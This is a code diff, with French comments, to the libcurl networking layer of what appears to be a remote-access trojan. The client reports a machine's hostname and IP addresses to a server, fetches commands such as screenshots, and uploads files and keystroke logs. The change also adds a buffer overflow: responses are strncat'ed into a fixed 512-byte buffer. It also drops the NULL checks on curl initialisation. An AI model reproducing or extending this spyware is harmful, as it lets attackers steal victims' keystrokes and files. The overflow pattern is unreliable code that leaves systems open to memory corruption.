@@ -5,28 +5,13 @@
 #include <string.h>
 #include <stdlib.h>
 
-/* Buffer interne pour capturer les réponses HTTP */
-typedef struct {
-    char  *data;
-    size_t size;
-} ResponseBuf;
-
-static size_t write_cb(void *contents, size_t size, size_t nmemb, void *userp) {
-    size_t real = size * nmemb;
-    ResponseBuf *buf = (ResponseBuf *)userp;
-    char *ptr = realloc(buf->data, buf->size + real + 1);
-    if (!ptr) return 0;
-    buf->data = ptr;
-    memcpy(buf->data + buf->size, contents, real);
-    buf->size += real;
-    buf->data[buf->size] = '\0';
-    return real;
+/* Callback curl : copie la réponse dans un buffer fixe passé en userdata */
+static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *buf) {
+    strncat((char *)buf, (char *)ptr, size * nmemb);
+    return size * nmemb;
 }
 
 int send_report(const char *url, const MachineReport *report) {
-    CURL *curl = curl_easy_init();
-    if (!curl) return 0;
-
     char json[DATA_BUFFER];
     snprintf(json, sizeof(json),
              "{\"hostname\":\"%s\",\"os_info\":\"%s\","
@@ -34,48 +19,43 @@ int send_report(const char *url, const MachineReport *report) {
              report->hostname, report->os_info,
              report->private_ip, report->public_ip);
 
-    ResponseBuf buf = {malloc(1), 0};
-    buf.data[0] = '\0';
-
+    char response[512] = {0};
     struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
+
+    CURL *curl = curl_easy_init();
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
     curl_easy_perform(curl);
-
-    /* Extrait l'ID depuis la réponse JSON : {"id": 42, ...} */
-    int machine_id = 0;
-    char *id_pos = strstr(buf.data, "\"id\":");
-    if (id_pos) sscanf(id_pos + 5, " %d", &machine_id);
-
-    free(buf.data);
     curl_slist_free_all(headers);
     curl_easy_cleanup(curl);
-    return machine_id;
+
+    /* Extrait l'ID depuis la réponse : {"id": 42, ...} */
+    int id = 0;
+    char *pos = strstr(response, "\"id\":");
+    if (pos) sscanf(pos + 5, " %d", &id);
+    return id;
 }
 
-void get_command(int machine_id, char *out_command, size_t size) {
-    CURL *curl = curl_easy_init();
-    if (!curl) { out_command[0] = '\0'; return; }
-
+void get_command(int machine_id, char *out, size_t size) {
     char url[BUFFER_SIZE];
     snprintf(url, sizeof(url), "%s/api/machines/%d/command", SERVER_BASE_URL, machine_id);
 
-    ResponseBuf buf = {malloc(1), 0};
-    buf.data[0] = '\0';
-
+    char response[512] = {0};
+    CURL *curl = curl_easy_init();
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
     curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
 
-    /* Extrait la valeur de "command" : {"command": "screenshot"} ou {"command": null} */
-    out_command[0] = '\0';
-    char *pos = strstr(buf.data, "\"command\":");
+    /* Extrait "command": "screenshot" ou "command": null → out reste vide */
+    out[0] = '\0';
+    char *pos = strstr(response, "\"command\":");
     if (pos) {
         pos += 10;
         while (*pos == ' ') pos++;
@@ -83,49 +63,40 @@ void get_command(int machine_id, char *out_command, size_t size) {
             pos++;
             size_t i = 0;
             while (*pos && *pos != '"' && i < size - 1)
-                out_command[i++] = *pos++;
-            out_command[i] = '\0';
+                out[i++] = *pos++;
+            out[i] = '\0';
         }
-        /* si "null", out_command reste vide */
     }
-
-    free(buf.data);
-    curl_easy_cleanup(curl);
 }
 
 void post_result(int machine_id, const char *result_json) {
-    CURL *curl = curl_easy_init();
-    if (!curl) return;
-
     char url[BUFFER_SIZE];
     snprintf(url, sizeof(url), "%s/api/machines/%d/result", SERVER_BASE_URL, machine_id);
 
-    /* On emballe result_json dans {"result": <json>} */
-    size_t payload_size = strlen(result_json) + 16;
-    char *payload = malloc(payload_size);
-    if (!payload) { curl_easy_cleanup(curl); return; }
-    snprintf(payload, payload_size, "{\"result\":%s}", result_json);
+    /* Le serveur attend {"result": <json>} — on alloue sur le tas car result_json peut être grand */
+    size_t len = strlen(result_json) + 16;
+    char *payload = malloc(len);
+    if (!payload) return;
+    snprintf(payload, len, "{\"result\":%s}", result_json);
 
     struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
+    CURL *curl = curl_easy_init();
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
     curl_easy_perform(curl);
-
-    free(payload);
     curl_slist_free_all(headers);
     curl_easy_cleanup(curl);
+    free(payload);
 }
 
 void upload_file(int machine_id, const char *filepath, const char *filename) {
-    CURL *curl = curl_easy_init();
-    if (!curl) return;
-
     char url[BUFFER_SIZE];
     snprintf(url, sizeof(url), "%s/api/machines/%d/upload", SERVER_BASE_URL, machine_id);
 
-    curl_mime *form = curl_mime_init(curl);
+    CURL *curl = curl_easy_init();
+    curl_mime *form      = curl_mime_init(curl);
     curl_mimepart *field = curl_mime_addpart(form);
     curl_mime_name(field, "file");
     curl_mime_filedata(field, filepath);
@@ -135,25 +106,21 @@ void upload_file(int machine_id, const char *filepath, const char *filename) {
     curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
     curl_easy_perform(curl);
-
     curl_mime_free(form);
     curl_easy_cleanup(curl);
 }
 
 void send_keylog(int machine_id, const char *data) {
-    CURL *curl = curl_easy_init();
-    if (!curl) return;
-
     char url[BUFFER_SIZE];
     snprintf(url, sizeof(url), "%s/api/machines/%d/keylog", SERVER_BASE_URL, machine_id);
 
     struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: text/plain");
+    CURL *curl = curl_easy_init();
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
     curl_easy_perform(curl);
-
     curl_slist_free_all(headers);
     curl_easy_cleanup(curl);
 }
